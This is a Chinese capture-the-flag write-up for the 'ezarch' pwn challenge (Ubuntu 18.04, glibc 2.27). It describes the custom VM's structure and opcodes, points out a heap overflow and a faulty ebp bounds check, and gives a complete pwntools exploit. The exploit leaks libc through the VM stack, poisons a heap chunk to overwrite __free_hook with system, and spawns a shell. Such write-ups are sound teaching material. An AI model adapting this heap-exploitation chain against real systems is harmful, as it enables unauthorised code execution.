# ezarch

环境是`Ubuntu18.04`,libc是`2.27`的

逆向挺简单的，漏洞找半天，最后学长解了，tree学长tql

vm结构
```c

struct __attribute__((packed)) __attribute__((aligned(2))) Arch
{
  char *text;
  char *stack;
  int stack_size;
  int mem_size;
  unsigned int break[256];
  unsigned int regs[16];
  unsigned int _eip;
  unsigned int _esp;
  unsigned int _ebp;
  unsigned __int16 eflags;
};
```
每条指令长度为10

```
0               1               2                              6                              
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|    OpCode     |     Type      |     Operand 1                |        Operand 2               |
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+



OpCode:
    1 -> add
    2 -> sub
    3 -> mov
    4 -> xor
    5 -> or
    6 -> and
    7 -> shift left
    8 -> shift right
    9 -> push
    10 -> pop
    11 -> call
    12 -> ret
```

`漏洞点`:堆溢出，输入init_size比memory_size大就行

```C
             v8->memory = (__int64)v7;
            v9 = 0LL;
            puts("[*]Memory inited");
            printf("[*]Inited size>", argv);
            __isoc99_scanf((__int64)"%llu", (__int64)&init_sz);
            printf("[*]Input Memory Now (0x%llx)\n", init_sz);
            while ( v9 < init_sz )
            {
              v11 = (void *)(virtual_machine->memory + v9);
              if ( init_sz - v9 > 0xFFF )
              {
                v10 = read(0, v11, 0x1000uLL);
                if ( v10 <= 0 )
                  goto LABEL_26;
              }
              else
              {
                v10 = read(0, v11, init_sz - v9);
                if ( v10 <= 0 )
LABEL_26:
                  exit(1);
              }
              v9 += v10;
            }

```
和对stack的ebp检查有误

```c
 _eeip = vmachine->_eip;
  v2 = vmachine->size;
  if ( _eeip >= v2 || (unsigned int)vmachine->_esp >= vmachine->stack_size || v2 <= vmachine->_ebp )
    return 1LL;
```
exp如下

```python
from pwn import *

def cmd(command):
	p.recvuntil(">")
	p.sendline(command)

def memory_set(msz,initsz,content,eip,esp,ebp):
	cmd('M')
	p.recvuntil("size>")
	p.sendline(str(msz))
	p.recvuntil("size>")
	p.sendline(str(initsz))
	p.recvuntil(")")
	p.send(content)
	p.recvuntil("eip>")
	p.sendline(str(eip))
	p.recvuntil("esp>")
	p.sendline(str(esp))
	p.recvuntil("ebp>")
	p.sendline(str(ebp))

def run():
	cmd('R')
	
def leaklibc():
	p.recvuntil("R1 --> ")
	low = int(p.recvuntil('\n',drop=True),16)
	p.recvuntil("R2 --> ")
	high = int(p.recvuntil('\n',drop=True),16)
	return (high << 32) | low

def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./ezarch")
		gdb.attach(p)
	# mov reg[0], stack[ebp]
	opcode = '\x03\x20' + p32(0) + p32(17)
	# sub reg[0], 0x20
	opcode+= '\x02\x10' + p32(0) + p32(0x20)
	# mov stack[ebp], reg[0]
	opcode+= '\x03\x02' + p32(17) + p32(0)
	# now stack pointer to stderr, let's get it
	opcode+= '\x0a\x00' + p32(1) + p32(0)
	opcode+= '\x0a\x00' + p32(2) + p32(0)
	
	memory_set(0x1010,len(opcode),opcode,0,0,0x1008)
	run()
	
	libc.address = leaklibc()-libc.symbols["_IO_2_1_stderr_"]
	
	info("libc : " + hex(libc.address))
	
	
	memory_set(0x68,1,'a',0,0,0)
	memory_set(0x1010,0x1028,'\x00'*0x1010+p64(0)+p64(0x71)+p64(libc.symbols['__free_hook']-0x8),0,0,0)
	memory_set(0x68,1,'a',0,0,0)
	memory_set(0x68,0x10,'/bin/sh\x00'+p64(libc.symbols["system"]),0,0,0)
	
	cmd('M')
	p.recvuntil("size>")
	p.sendline(str(0))
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc.so",checksec=False)
	main(args['REMOTE'])
```
